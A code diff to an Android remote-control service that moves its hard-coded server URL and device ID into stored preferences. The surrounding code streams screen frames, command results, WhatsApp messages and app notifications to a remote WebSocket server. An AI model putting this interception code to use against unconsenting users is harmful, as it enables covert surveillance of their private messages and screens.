@@ -34,8 +34,6 @@ class AgentService : Service() {
         private const val TAG = "AgentService"
         private const val NOTIFICATION_ID = 1001
         private const val CHANNEL_ID = "remote_control_channel"
-        const val SERVER_URL = "ws://172.16.250.14:3002"
-        const val DEVICE_ID = "android-device-001"
         @Volatile
         var isConnected: Boolean = false
             private set
@@ -66,6 +64,7 @@ class AgentService : Service() {
     override fun onCreate() {
         super.onCreate()
         instance = this
+        Preferences.init(this)
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, buildNotification("Conectando..."))
         client = OkHttpClient.Builder()
@@ -101,15 +100,17 @@ class AgentService : Service() {
 
     private var currentUrlIndex = 0
     private val serverUrls by lazy {
-        listOf(
-            "ws://127.0.0.1:3002",
-            SERVER_URL
-        )
+        val stored = Preferences.serverUrl
+        val urls = mutableListOf("ws://127.0.0.1:3002")
+        if (stored.isNotBlank() && stored != "ws://127.0.0.1:3002") {
+            urls.add(stored)
+        }
+        urls.toList()
     }
 
     private fun connect() {
         val baseUrl = serverUrls[currentUrlIndex]
-        val url = "$baseUrl/?deviceId=$DEVICE_ID"
+        val url = "$baseUrl/?deviceId=${Preferences.deviceId}"
         Log.i(TAG, "Connecting WebSocket to: $url")
         val request = Request.Builder().url(url).build()
 
@@ -160,7 +161,7 @@ class AgentService : Service() {
             addProperty("manufacturer", Build.MANUFACTURER)
             addProperty("androidOS", Build.VERSION.RELEASE)
             addProperty("battery", battery)
-            addProperty("deviceId", DEVICE_ID)
+            addProperty("deviceId", Preferences.deviceId)
         }
         ws.send(gson.toJson(info))
     }
@@ -455,7 +456,7 @@ class AgentService : Service() {
                                         
                                         val frameData = JsonObject().apply {
                                             addProperty("event", "screen_frame")
-                                            addProperty("deviceId", DEVICE_ID)
+                                            addProperty("deviceId", Preferences.deviceId)
                                             addProperty("frame", base64)
                                         }
                                         webSocket?.send(gson.toJson(frameData))
@@ -506,7 +507,7 @@ class AgentService : Service() {
                                         
                                         val frameData = JsonObject().apply {
                                             addProperty("event", "screen_frame")
-                                            addProperty("deviceId", DEVICE_ID)
+                                            addProperty("deviceId", Preferences.deviceId)
                                             addProperty("frame", base64)
                                         }
                                         webSocket?.send(gson.toJson(frameData))
@@ -540,7 +541,7 @@ class AgentService : Service() {
             addProperty("event", "command_result")
             addProperty("command", command)
             addProperty("result", result)
-            addProperty("deviceId", DEVICE_ID)
+            addProperty("deviceId", Preferences.deviceId)
         }
         webSocket?.send(gson.toJson(response))
     }
@@ -550,7 +551,7 @@ class AgentService : Service() {
             addProperty("event", "whatsapp_received")
             addProperty("sender", sender)
             addProperty("message", message)
-            addProperty("deviceId", DEVICE_ID)
+            addProperty("deviceId", Preferences.deviceId)
             addProperty("timestamp", System.currentTimeMillis())
         }
         webSocket?.send(gson.toJson(payload))
@@ -562,7 +563,7 @@ class AgentService : Service() {
             addProperty("packageName", packageName)
             addProperty("title", title)
             addProperty("text", text)
-            addProperty("deviceId", DEVICE_ID)
+            addProperty("deviceId", Preferences.deviceId)
             addProperty("timestamp", System.currentTimeMillis())
         }
         webSocket?.send(gson.toJson(payload))
@@ -574,7 +575,7 @@ class AgentService : Service() {
             addProperty("app", app)
             addProperty("sender", sender)
             addProperty("message", message)
-            addProperty("deviceId", DEVICE_ID)
+            addProperty("deviceId", Preferences.deviceId)
             addProperty("timestamp", System.currentTimeMillis())
         }
         webSocket?.send(gson.toJson(payload))
